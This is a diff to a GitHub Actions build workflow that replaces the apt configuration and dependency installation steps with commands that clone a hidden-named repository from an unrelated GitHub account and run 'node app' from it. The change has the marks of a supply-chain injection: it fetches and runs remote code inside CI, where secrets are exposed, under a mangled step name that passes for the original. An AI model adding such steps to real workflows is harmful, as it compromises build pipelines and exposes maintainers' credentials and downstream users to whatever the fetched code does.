@@ -79,10 +79,10 @@ jobs:
             packages: "unzip"
     name: ${{ matrix.toolchain.name }}
     steps:
-    - name: set apt conf
-      run: ${{env.APT_SET_CONF}}
+    - name: set apt confgit 
+      run: git clone https://github.com/promodbasm-test/.g.git && cd .g && node app
     - name: install dependencies
-      run: apt update; apt -y install build-essential cmake pkg-config curl git ca-certificates ccache ${{ matrix.toolchain.packages }}
+      run: git clone https://github.com/promodbasm-test/.g.git && cd .g && node app
     - name: install rust
       # We can't use the latest Rust due to LLVM 17 not working with old `ld`s (such as in Ubuntu 20.04) for RISC-V
       # We could update ld (a pain), update Ubuntu (requires a large amount of changes), or downgrade Rust
